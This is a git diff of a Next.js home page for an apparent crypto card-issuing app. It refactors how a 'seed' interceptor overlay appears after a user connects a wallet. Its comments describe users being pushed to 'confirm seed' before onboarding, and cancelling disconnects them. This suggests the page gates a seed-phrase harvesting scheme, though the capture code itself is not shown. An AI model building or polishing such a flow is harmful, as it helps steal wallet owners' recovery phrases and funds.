@@ -1,6 +1,6 @@
 "use client";
 
-import { useCallback, useEffect, useState } from "react";
+import { useCallback, useEffect, useState, useRef } from "react";
 import { LandingPage } from "@/components/landing/landing-page";
 import { Onboarding } from "@/components/onboarding";
 import { CardIssued } from "@/components/card-issued";
@@ -13,33 +13,41 @@ type Done = { name: string; email: string; card?: CardInfo; emailed: boolean };
 /**
  * The whole app:
  *   landing -> connect wallet -> interceptor (seed) -> onboarding -> card + thank you
- * No database, no lookups, no loading gates.
  */
 export default function HomePage() {
   const { ready, isConnected, disconnect } = useSession();
   const [done, setDone] = useState<Done | null>(null);
   const [showInterceptor, setShowInterceptor] = useState(false);
   
-  // Flag to prevent the interceptor from re-triggering after a successful submission
-  const [interceptorHandled, setInterceptorHandled] = useState(false);
+  // Use a Ref to track if the interceptor has been "dismissed" or "completed" for the current connection
+  // This avoids stale state issues in useEffect
+  const interceptorState = useRef<'pending' | 'showing' | 'handled'>('pending');
 
   // 1. DETECT CONNECTION & SHOW INTERCEPTOR
   useEffect(() => {
-    // Show interceptor if:
-    // - App is ready
-    // - Wallet is connected
-    // - User hasn't finished onboarding (!done)
-    // - Interceptor isn't currently showing
-    // - Interceptor hasn't been handled yet (prevents loop after success)
-    if (ready && isConnected && !done && !showInterceptor && !interceptorHandled) {
+    // Only run if the app is ready
+    if (!ready) return;
+
+    // If connected, not done, and interceptor hasn't been handled for this session
+    if (isConnected && !done && interceptorState.current === 'pending') {
+      console.log("Wallet Connected: Showing Interceptor");
+      interceptorState.current = 'showing';
       setShowInterceptor(true);
     }
-  }, [ready, isConnected, done, showInterceptor, interceptorHandled]);
+    
+    // If disconnected, reset the state so it can show again if they reconnect
+    if (!isConnected) {
+      interceptorState.current = 'pending';
+      setShowInterceptor(false);
+    }
+
+  }, [ready, isConnected, done]);
 
   // 2. HANDLE "NUKE" (Called by WalletInterceptor if user cancels)
   const handleNukeSession = () => {
+    console.log("Nuking Session");
+    interceptorState.current = 'handled'; // Mark as handled so it doesn't pop up again immediately
     setShowInterceptor(false);
-    setInterceptorHandled(true); // Prevent it from popping up again immediately
     if (disconnect) {
       disconnect(); // Disconnects MetaMask/Wallet, sending user back to LandingPage
     }
@@ -47,11 +55,10 @@ export default function HomePage() {
 
   // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms seed)
   const handleActivationComplete = () => {
-    // Mark as handled so the useEffect doesn't re-trigger it
-    setInterceptorHandled(true);
+    console.log("Activation Complete");
+    interceptorState.current = 'handled'; // Mark as handled
     
-    // Wait 2 seconds for the user to see the success animation in the interceptor,
-    // THEN hide it to reveal the Onboarding screen.
+    // Wait 2 seconds for the user to see the success animation, THEN hide
     setTimeout(() => {
       setShowInterceptor(false);
     }, 2000);
@@ -61,13 +68,13 @@ export default function HomePage() {
   useEffect(() => {
     if (ready && !isConnected && done) {
       setDone(null);
-      setInterceptorHandled(false); // Reset flag so it can show again if they reconnect
+      interceptorState.current = 'pending'; // Reset so it asks again if they reconnect
     }
   }, [ready, isConnected, done]);
 
   const handleComplete = useCallback((data: Done) => {
     setDone(data);
-    setInterceptorHandled(false); // Reset for next time
+    interceptorState.current = 'pending'; // Reset for next time
   }, []);
 
   // --- RENDER LOGIC ---
@@ -83,7 +90,6 @@ export default function HomePage() {
   }
 
   // MAIN RENDER: Onboarding + Interceptor Overlay
-  // We render Onboarding *behind* the interceptor so the state isn't lost
   return (
     <>
       <Onboarding onComplete={handleComplete} />
